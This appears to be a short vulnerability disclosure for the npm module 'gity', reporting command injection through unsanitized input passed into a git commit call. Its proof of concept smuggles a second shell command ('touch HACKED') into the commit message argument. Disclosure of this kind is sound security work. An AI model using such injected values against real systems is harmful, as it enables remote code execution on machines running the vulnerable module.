# Description

The `gity` module is vulnerable against `arbitrary command injection` caused by `insecure concatenation` of `user supplied` data which aren't sanitized properly, leading to `RCE`.

# POC

1. Create the following PoC file:

```js
// poc.js
var Git = require('gity');
 
var git = Git()
  .add('*.js')
  .commit('-m "added js files";touch HACKED;#')
  .run();

```
2. Make sure that the `HACKED` file doesn't exist 
3. Execute the following commands in another terminal:

```bash
npm i gity # Install affected module
node poc.js #  Run the PoC
```
4. The `HACKED` file is created :)
